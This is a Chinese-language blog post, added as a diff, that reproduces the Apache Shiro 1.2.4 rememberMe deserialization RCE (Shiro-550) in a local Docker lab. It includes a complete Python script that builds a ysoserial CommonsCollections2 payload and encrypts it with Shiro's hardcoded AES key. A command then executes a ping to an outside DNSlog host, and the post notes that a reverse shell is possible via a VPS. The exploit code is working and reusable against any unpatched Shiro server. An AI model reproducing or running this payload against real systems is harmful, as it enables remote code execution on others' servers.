@@ -1,0 +1,121 @@
+---
+layout:	post
+title:	"Apache Shiro 1.2.4反序列化"
+date:	2020-07-31 17:08:09 +0800
+tags:	漏洞复现
+color:	rgb(205,55,0)
+cover:	'../assets/blog_pic/20200731_shiro/cover.png'
+subtitle:	'Shiro-550-只是复现没有定位'
+
+---
+
+* 目录
+{:toc}
+# 概述
+
+**产生原因**
+
+shiro默认使用了CookieRememberMeManager, 其处理cookie的流程是: 得到rememberMe的cookie值-->Base64解码-->AES解密-->反序列化.然而AES的密钥是硬编码的, 就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞
+
+**影响范围**
+
+Apache Shiro <= 1.2.4
+
+# 复现环境
+
+kali里的docker，pull一个已有镜像
+
+```
+sudo docker pull medicean/vulapps:s_shiro_1
+```
+
+启动环境，8081代表环境运行在宿主机的8081端口
+
+```
+sudo docker run -d 8081:8080 medicean/vulapps:s_shiro_1
+```
+
+# 复现过程
+
+访问http://127.0.0.1:8081
+
+![avatar](../../assets/blog_pic/20200731_shiro/login.png)
+
+抓包查看，响应包中存在rememberMe=deleteMe
+
+![avatar](../../assets/blog_pic/20200731_shiro/rememberme.png)
+
+我们这里用[DNSlog](http://www.dnslog.cn/)来证明漏洞存在，获取一个DNSlog:hvl78d.dnslog.cn
+
+![avatar](../../assets/blog_pic/20200731_shiro/dnslog.png)
+
+生成新的**rememberMe**脚本**shiro.py**
+
+```
+import sys
+import base64
+import uuid
+from random import Random
+import subprocess
+from Crypto.Cipher import AES
+
+def encode_rememberme(command):
+    popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-30099844c6-1.jar', 'CommonsCollections2', command], stdout=subprocess.PIPE)
+    BS   = AES.block_size
+    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+    key  =  "kPH+bIxk5D2deZiIxcaaaA=="
+    mode =  AES.MODE_CBC
+    iv   =  uuid.uuid4().bytes
+    encryptor = AES.new(base64.b64decode(key), mode, iv)
+    file_body = pad(popen.stdout.read())
+    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+    return base64_ciphertext
+
+if __name__ == '__main__':
+    payload = encode_rememberme(sys.argv[1])    
+    with open("payload.cookie", "w") as fpw:
+        print("rememberMe={}".format(payload.decode()), file=fpw)
+```
+
+生成新的**rememberMe**
+
+```
+python shiro.py "ping hvl78d.dnslog.cn"
+```
+
+生成一个名为payload.cookie的文件，将里面的**rememberMe**复制到之前burp抓包中，放行
+
+![avatar](../../assets/blog_pic/20200731_shiro/repeater.png)
+
+查看DNSlog
+
+![avatar](../../assets/blog_pic/20200731_shiro/hvl78d.png)
+
+证明漏洞存在，可以通过vps反弹shell
+
+
+
+注：如果不成功，看看自己是不是登录以后抓的包，如果是登录以后抓的包就不能复现
+
+# 高科技
+
+ShiroExploit：支持对Shiro-550（硬编码秘钥）和Shiro-721（Padding Oracle）的一键化检测，支持简单回显。
+[Github项目地址](https://github.com/feihong-cs/ShiroExploit)
+
+
+
+# Refer
+
+[https://cloud.tencent.com/developer/article/1540882](fuzhi)
+
+[https://www.jianshu.com/p/0007eafd1f92](yes)
+
+
+
+
+
+
+
+
+
+ps：文章内容均为本人学习记录，造成其他后果不负责任
